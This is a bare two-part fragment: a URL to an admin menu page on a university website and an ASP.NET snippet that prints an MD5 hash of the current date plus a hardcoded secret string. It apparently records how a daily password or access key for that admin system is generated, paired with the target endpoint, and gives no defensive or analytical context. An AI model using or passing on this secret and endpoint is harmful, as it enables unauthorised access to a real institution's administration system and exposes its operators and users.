http://slmt.cqu.edu.cn/admin/sys/menu/menuset.aspx


<%@ Page Language="C#"%>
<% Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile(DateTime.Now.ToString("yyyy-MM-dd")+"-Flyshit@!@drcom","MD5")); %>